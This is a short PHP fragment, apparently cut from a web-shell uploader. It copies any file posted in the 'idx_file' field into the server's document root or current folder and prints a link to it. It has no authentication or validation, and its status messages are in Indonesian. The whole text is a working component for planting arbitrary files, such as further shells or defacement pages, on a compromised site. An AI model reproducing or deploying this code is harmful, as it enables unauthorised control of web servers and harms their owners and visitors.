<?php
   }
  $root = $_SERVER['DOCUMENT_ROOT'];
  $files = $_FILES['idx_file']['name'];
  $dest = $root.'/'.$files;
  if(isset($_POST['upload'])) {
  if(is_writable($root)) {
  if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
  $web = "http://".$_SERVER['HTTP_HOST']."/";
  echo "done -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
  } else {
  echo "no upload";
  }
  } else {
  if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
  echo "done <b>$files</b> di folder ini";
  } else {
  echo "no upload";
  }
  }
  }
  ?>
